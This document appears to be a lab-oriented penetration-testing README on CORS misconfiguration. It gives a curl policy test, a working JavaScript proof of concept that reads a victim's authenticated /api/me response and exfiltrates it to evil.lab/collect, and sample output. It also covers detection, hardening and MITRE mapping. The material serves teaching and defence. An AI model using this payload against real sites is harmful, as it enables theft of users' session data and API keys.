> **English** | [Italiano](README.md)

# CORS misconfiguration

> - **Phase:** Web exploitation - OWASP A05:2021 Security Misconfiguration
> - **Visibility:** Low - cross-origin requests with a manipulated `Origin` header; the exfiltration happens in the victim's browser
> - **Prerequisites:** an endpoint that reflects or poorly validates the `Origin` header in the CORS response, especially with `Access-Control-Allow-Credentials: true`
> - **Nature of the document:** methodology + practical payloads for a lab environment. No fabricated Finding ID (next `WEB-016`, to assign in lab).

- Objective: exploit a permissive CORS policy to read, from the victim's browser, authenticated data of another origin and exfiltrate it to a controlled site.

---

## Executive summary

CORS governs which origins may read cross-origin responses. A misconfiguration - typically **reflecting the
request's `Origin`** in the `Access-Control-Allow-Origin` header together with
`Access-Control-Allow-Credentials: true` - lets an attacker site make the victim's browser issue authenticated
requests to the vulnerable app and **read its response** (personal data, tokens, API keys). The typical severity
is `High` (theft of authenticated data), higher if the response contains reusable secrets.

## Execution / commands

### Phase 1 - policy test

```bash
# Send an arbitrary Origin and observe the CORS headers in the response
curl -s -I https://target.lab/api/me -H "Origin: https://evil.lab"
```

```
# Exploitable configuration (reflects the origin + credentials enabled):
Access-Control-Allow-Origin: https://evil.lab   <-- reflected origin
Access-Control-Allow-Credentials: true          <-- cookies are sent and the response is readable
```

Misconfig variants to test: `Origin: null` (accepted), prefix/suffix-only match (`evil.target.lab`,
`target.lab.evil.lab`), weak regexes.

### Phase 2 - exfiltration (attacker-side PoC)

A page hosted on `evil.lab` that the victim visits: the browser sends the cookies and the attacker reads the
response.

```html
<script>
fetch('https://target.lab/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://evil.lab/collect?d=' + encodeURIComponent(d)));  // exfiltrate the authenticated data
</script>
```

Illustrative output (on the attacker's server):

```
GET /collect?d=%7B%22user%22%3A%22admin%22%2C%22apiKey%22%3A%22****%22%7D   <-- victim data exfiltrated
```

## Analysis of results

If the response contains the reflected `Origin` + `Allow-Credentials: true`, theft of authenticated data is
possible: severity `High` (or `Critical` if the response includes reusable tokens/keys). If the app uses a fixed
origin allowlist and does not reflect the input, the vector is closed.

### Theoretical analysis

CORS is a cross-origin trust control: saying "I trust whoever asks" (reflecting the origin) with credentials
enabled nullifies the Same-Origin Policy. The countermeasure is an **explicit allowlist** of trusted origins,
never reflecting the input, and `Allow-Credentials: true` only toward known origins.

## Remediation (blue team)

**Detection.** Responses where `Access-Control-Allow-Origin` matches an arbitrary request `Origin`;
`Allow-Credentials: true` with a reflected origin; acceptance of `Origin: null`.

**Hardening.** Static allowlist of origins; never reflect the `Origin`; avoid `Allow-Credentials: true` where not
indispensable; validate the whole origin (scheme+host+port), not prefixes/suffixes.

---

## Real-world scenario: post-exploitation projection

> Applies to the "authenticated data theft" outcome (severity High/Critical).

**Red team:** an `evil.lab` site with the fetch PoC; the authenticated victim visits it; their data/tokens are
read and exfiltrated, then reused against the app (account takeover or API access).

**Blue team:** detect reflected `Allow-Origin` and accepted `Origin: null`; fix with an allowlist; rotate any
exposed tokens. Lesson: CORS must not be "opened for convenience"; it is a trust perimeter.

## Reference tools

| tool | type | technique/access | main use case |
| :--- | :--- | :--- | :--- |
| `Burp Suite` | proxy/scanner | web - active | manipulates the `Origin` header and analyzes the cors response |
| `curl` | http client | cli - active | quick test of the cors headers with an arbitrary origin |
| `CORScanner` | scanner | cli - active | automated detection of cors misconfigurations |

## MITRE ATT&CK mapping

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| initial access | exploit public-facing application | `T1190` | exploitation of the permissive cors policy on an exposed endpoint. |
| credential access | steal web session cookie | `T1539` | cross-origin reading of authenticated session data/tokens. |
| collection | data from information repositories | `T1213` | exfiltration of the authenticated data read from the response. |

---

## Links to other findings

| source | this technique | effect |
| :--- | :--- | :--- |
| [xss](<../xss (Cross-Site Scripting)/README.en.md>) | cors misconfiguration | both exfiltrate data browser-side; often combined |
| cors misconfiguration | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.en.md>) | the remediation (origin allowlist) links to secure coding |

---

> **Note:** Educational content. The payloads are functional and must be used only on owned applications or with explicit authorization, in a lab. Illustrative outputs.
